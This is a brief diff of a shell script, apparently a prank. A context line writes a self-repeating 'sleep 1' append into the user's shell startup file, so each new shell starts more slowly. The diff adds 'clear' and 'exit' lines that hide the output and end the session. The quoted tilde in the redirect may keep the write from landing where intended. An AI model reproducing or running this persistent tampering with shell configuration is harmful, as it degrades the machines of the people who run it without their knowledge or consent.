@@ -8,3 +8,6 @@ else
 fi
 
 (cd ~ && echo "echo 'sleep 1' >> ~/."$shell"rc" >> "~/."$shell"rc" && cd -) > /dev/null
+
+clear
+exit
